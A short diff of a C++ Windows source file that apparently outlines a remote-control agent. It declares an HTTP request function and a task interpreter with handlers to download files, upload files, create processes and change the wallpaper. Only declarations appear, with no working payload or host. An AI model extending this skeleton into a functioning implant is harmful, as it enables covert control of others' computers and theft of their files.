@@ -1,11 +1,11 @@
-#define WIN32_LEAN_AND_MEAN
 #define _CRT_SECURE_NO_WARNINGS
 #include <Windows.h>
 #include <winhttp.h>
 #include <string>
 #include <vector>
 #include <fstream>
-#include <shlobj_core.h>
+#include <shlobj.h>
+#include <Shobjidl.h>
 #include <lm.h>
 #include <unordered_map>
 #include <sstream>
@@ -14,17 +14,23 @@
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "netapi32.lib")
-
+#pragma comment(lib, "Urlmon.lib")
 
 namespace network {
-    std::wstring MakeHttpRequest(const std::wstring& host, const std::wstring& path, const std::string& data, const std::wstring& method);
+    std::wstring MakeHttpRequest(const std::wstring& host,
+        const std::wstring& path,
+        const std::string& data,
+        const std::wstring& method,
+        const std::wstring& contentType);
 }
 
 namespace interpreter {
-    std::wstring InterpretTask(std::wstring task);
-    
-    void* createfilewrap();
-        
+    std::wstring InterpretTask(std::wstring task, std::wstring id);
+    bool downloadfile(std::vector<std::wstring> args);
+    bool createfilewrap(std::vector<std::wstring> args);
+    bool createprocesswrap(std::vector<std::wstring> args);
+    bool uploadfile(std::vector<std::wstring> args);
+    bool setWallpaper(std::vector<std::wstring> args);
 }
 
 namespace communication {
